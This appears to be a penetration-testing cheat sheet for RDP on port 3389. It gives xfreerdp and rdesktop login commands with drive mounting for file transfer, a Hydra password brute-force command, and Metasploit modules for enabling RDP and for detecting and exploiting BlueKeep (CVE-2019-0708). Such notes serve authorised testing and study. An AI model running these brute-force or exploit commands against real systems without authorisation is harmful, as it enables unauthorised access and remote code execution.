---
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: false
---

# 3389 - RDP

## XfreeRDP

```bash
# Connect with AUTHENTICATION
xfreerdp /u:Administrator /p:password123 /v:$IP:$PORT /cert:ignore

# Connect with AUTHENTICATION (mount Linux folder for file transfer)
# connect to \\tsclient\ for accessing the directory
xfreerdp /u:Administrator /p:password123 /v:$IP:$PORT /cert:ignore /drive:linux,/tmp
```

## Rdesktop

```bash
# Connect with AUTHENTICATION
rdesktop $IP -d local -u Administrator -p 'password123'

# Connect with AUTHENTICATION (mount Linux folder for file transfer)
# connect to \\tsclient\ for accessing the directory
rdesktop $IP -d local -u Administrator -p 'password123' -r disk:linux='/tmp'
```

## Hydra

```bash
hydra -l "Administrator" -P /wordlists/passwords.txt rdp://$IP -s $PORT
```

## MSFconsole

```bash
# Checking RDP present, none default `port:3389`
auxiliary/scanner/rdp/rdp_scanner

# Enabling RDP
post/windows/manage/enable_rdp

# Scan OS, if it's vulnerable to bluekeep
auxiliary/scanner/cve_2019_0708_bluekeep

# Exploit the bluekeep (64 bit)
exploit/windows/rdp/cve_2019_0708_bluekeep_rce
```
